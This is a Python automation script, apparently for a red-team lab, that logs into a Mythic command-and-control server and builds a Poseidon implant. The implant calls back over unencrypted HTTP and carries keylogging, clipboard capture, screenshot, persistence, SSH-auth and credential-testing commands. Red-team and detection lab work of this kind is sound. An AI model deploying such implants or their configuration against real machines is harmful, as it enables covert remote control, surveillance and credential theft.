#!/usr/bin/env python
import asyncio
import logging
import time

from aiohttp import ClientConnectorError
from gql.transport.exceptions import TransportServerError
from mythic import mythic

logger = logging.getLogger("create_payload")
logger.setLevel(logging.INFO)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
logger.addHandler(console_handler)

# Note that the UUID is hardcoded and encryption is disabled.
# I do this so I don't have to wait for the payload to build
# each time I start Mythic - the same payload can be used
# across multiple Mythic instances.
payload_json = """
{
    "description": "Created by mythic_admin at 2024-07-30 01:30:33 Z",
    "payload_type": "poseidon",
    "c2_profiles": [
        {
            "c2_profile": "http",
            "c2_profile_is_p2p": false,
            "c2_profile_parameters": {
                "AESPSK": {
                    "dec_key": null,
                    "enc_key": null,
                    "value": "none"
                },
                "callback_host": "http://192.168.230.42",
                "callback_interval": 1,
                "callback_jitter": 0,
                "callback_port": 80,
                "encrypted_exchange_check": false,
                "get_uri": "index",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
                },
                "killdate": "2025-07-30",
                "post_uri": "data",
                "proxy_host": "",
                "proxy_pass": "",
                "proxy_port": "",
                "proxy_user": "",
                "query_path_name": "q"
            }
        }
    ],
    "build_parameters": [
        {
            "name": "mode",
            "value": "default"
        },
        {
            "name": "architecture",
            "value": "AMD_x64"
        },
        {
            "name": "proxy_bypass",
            "value": false
        },
        {
            "name": "garble",
            "value": false
        },
        {
            "name": "debug",
            "value": true
        },
        {
            "name": "egress_order",
            "value": [
                "http"
            ]
        },
        {
            "name": "egress_failover",
            "value": "failover"
        },
        {
            "name": "failover_threshold",
            "value": 10
        },
        {
            "name": "static",
            "value": false
        }
    ],
    "commands": [
        "clipboard_monitor",
        "cp",
        "curl",
        "curl_env_clear",
        "curl_env_get",
        "curl_env_set",
        "download",
        "drives",
        "execute_library",
        "exit",
        "getenv",
        "getuser",
        "head",
        "jobkill",
        "jobs",
        "jsimport",
        "jsimport_call",
        "jxa",
        "keylog",
        "keys",
        "kill",
        "libinject",
        "link_tcp",
        "link_webshell",
        "list_entitlements",
        "clipboard",
        "mkdir",
        "mv",
        "persist_launchd",
        "persist_loginitem",
        "portscan",
        "print_c2",
        "print_p2p",
        "prompt",
        "ps",
        "pty",
        "pwd",
        "rm",
        "rpfwd",
        "run",
        "screencapture",
        "setenv",
        "shell",
        "sleep",
        "socks",
        "sshauth",
        "sudo",
        "tail",
        "tcc_check",
        "test_password",
        "triagedirectory",
        "ls",
        "xpc_service",
        "xpc_submit",
        "xpc_unload",
        "cat",
        "cd",
        "listtasks",
        "unlink_tcp",
        "unlink_webshell",
        "unsetenv",
        "update_c2",
        "upload",
        "xpc_load",
        "xpc_manageruid",
        "xpc_procinfo",
        "xpc_send"
    ],
    "selected_os": "Linux",
    "filename": "poseidon.bin",
    "wrapped_payload": "",
    "uuid": "17d7c6b5-33e7-4321-a17b-4272836e4977"
}
"""

create_payload_query = """
mutation createPayloadMutation($payload: String!) {
  createPayload(payloadDefinition: $payload) {
    error
    status
    uuid
  }
}
"""


async def mythic_login(host: str, port: int, user: str, password: str, timeout=-1):
    logger.error(f"Logging into Mythic[{host}:{port}] User[{user}]")
    mythic_instance = None

    retries = 0
    total_retries = 30
    while retries < total_retries:
        try:
            mythic_instance = await mythic.login(
                username=user,
                password=password,
                server_ip=host,
                server_port=port,
                timeout=-1,
                logging_level=logging.FATAL,  # Hiding failed login errors for now
            )
            # Restore default logging level
            mythic_instance.logger.setLevel(logging.WARN)
            return mythic_instance
        except (ClientConnectorError, TransportServerError) as e:
            if retries == 0:
                print("Waiting for Mythic", end="", flush=True)
            else:
                print(".", end="", flush=True)

            retries += 1
            time.sleep(1)
            continue

    print()
    return None


async def create_payload(mythic_instance):
    logger.info("Creating payload")

    retries = 0
    total_retries = 10
    while retries < total_retries:
        try:
            new_payload = await mythic.execute_custom_query(
                mythic=mythic_instance,
                query=create_payload_query,
                variables={"payload": payload_json},
            )
            return new_payload

        except TransportServerError:
            logger.warning(f"({retries}/{total_retries}) Graphql not online yet...")
            retries += 1
            time.sleep(1)
            continue
    return None


async def main():
    mythic_instance = await mythic_login("192.168.230.42", 7443, "a", "a")

    if not mythic_instance:
        logger.error("Failed to login to Mythic. Quitting...")
        return

    new_payload = await create_payload(mythic_instance)
    if not new_payload:
        print("Failed to create payload. Quitting...")
        return

    if new_payload["createPayload"]["error"]:
        print(f"Failed to create payload: {new_payload['createPayload']['error']}")
        return


# Running the main function
if __name__ == "__main__":
    asyncio.run(main())
